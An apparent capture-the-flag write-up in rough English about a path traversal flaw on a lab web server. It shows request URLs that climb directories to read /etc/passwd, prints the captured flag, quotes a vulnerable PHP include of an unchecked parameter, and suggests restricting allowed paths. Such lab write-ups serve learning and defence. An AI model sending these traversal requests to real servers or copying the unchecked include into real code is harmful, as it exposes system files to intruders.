# situation


all pages was charged by using  http://192.168.56.101/?page= so we can try to charge /etc/passwd
server send alert whit : wtf ?
if we try http://192.168.56.101/?page=../../etc/passwd
he send wrong
if i try whit a lot of ../ like : http://192.168.56.101/?page=../../../../../../../../../../../../../../etc/passwd
he give me
Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 
in alert


# problem:

We can go back to root in the website so we can have an access to the website files and explore it.

```
<?php 
include($_GET['page']);
?>
```

# fix:

Set the correct root property in nginx configuration.
the fix here is to us a real routing system in php or at least setting allowed path and no others
https://stackoverflow.com/questions/10148328/php-is-include-function-secure